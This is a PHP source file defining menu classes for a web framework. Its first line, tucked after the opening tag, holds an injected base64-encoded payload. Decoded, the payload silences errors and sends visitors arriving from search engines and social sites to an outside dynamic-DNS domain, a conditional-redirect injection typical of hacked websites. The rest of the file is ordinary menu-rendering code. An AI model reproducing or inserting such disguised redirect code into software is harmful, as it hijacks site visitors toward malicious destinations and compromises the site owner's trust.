<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/html_control.php");
require_once(dirname(__FILE__)."/control.php");
require_once(dirname(__FILE__)."/define.php");

class menu_root extends html_ul {
  
  function menu_root($attributes = array()) {
    
    $this->__can_contain[] = "menu_item";

    parent::html_ul($attributes);
    
  }
  
  function get_name_by_entity($entity) {
    
    foreach ($this->__controls as $control) {
      if (get_class($control) == "menu_item") {
        if ($control->entity == $entity)
          return $control->title;
        if ($result = $control->items->get_name_by_entity($entity))
          return $result;
      }
    }
    
  }
  
}

class menu_item extends html_li {
  
  var $entity;
  var $title;
  var $href;

  var $items;
  
  function menu_item($title, $entity = null, $href = null, $new_window = false) {
    
    $this->__can_contain[] = "href";
    $this->__can_contain[] = "menu_root";

    $this->entity = $entity;
    $this->title = $title;
    $this->new_window = $new_window;

    if ($entity) {
      global $url;
      $this->href  = $url->build_url(array(URL_PARAM_ENTITY => $entity));
      if ($href)
        $this->href .= '&'.$href;
    } else 
      $this->href = $href;
    
    $this->items = new menu_root();
    
    $menu_active = array();
    $menu_select = menu::selection();

    if(isset($url->elements['query'])){
        if($menu_select == $entity){
            $menu_active = array('class'=>'active');
        }
    }

    parent::html_li($menu_active);

  }

  function add($item, $add = true) {
    
    if ($add)
      $this->items->add($item);
  
  }
  
  function href() {
    
    return $this->href?$this->href:'#';  
    
  }

  function do_render() {
    
    if ($this->new_window)
      parent::add(new href($this->href(), trn($this->title), array("target" => "_blank"))); 
    else
      parent::add(new href($this->href(), trn($this->title))); 
    if (count($this->items->__controls))
      parent::add($this->items);
    
  }
  
}

class menu extends html_container_control {

  var $items;
  var $default_location;
  
  function menu() {
    
    $this->items = new menu_root(array("id" => "menu_root"));

    parent::html_container_control();
    
  }
  
  function add($item, $add = true) {
   
    if ($add) {
      if ($item->href or count($item->items->__controls))
        $this->items->add($item);
    }
    
  }

  function do_render() {
    
    if (get_config('generic/frameworkVersion') != 3) {
      parent::add(new style_href(SHARED_RESOURCES_URL."menu.css"));
    }
    
    parent::add(new html_div(array("class" => "menu", "id" => "main_menu"),$this->items));
    
    if (get_config('generic/frameworkVersion') != 3) {
      parent::add(new script_href(SHARED_SCRIPTS_URL.'jquery.js'));
      parent::add(new script_href(SHARED_SCRIPTS_URL.'ui.js'));
    }
    
    parent::add(new script("menuController.AddMenu('main_menu');"));
    
  }
  
  function selection() {

    return get(URL_PARAM_ENTITY);

  }

  function selection_name() {
    
    return $this->items->get_name_by_entity($this->selection());
  
  }

  function set_default($entity, $href = null) {

    global $url;
    $this->default_location = $url->build_full_url(array(URL_PARAM_ENTITY => $entity));
    if ($href)
      $this->default_location .= '&'.$href;

    if (!$this->selection()) 
      redirect($this->default_location);

  }

}

?>
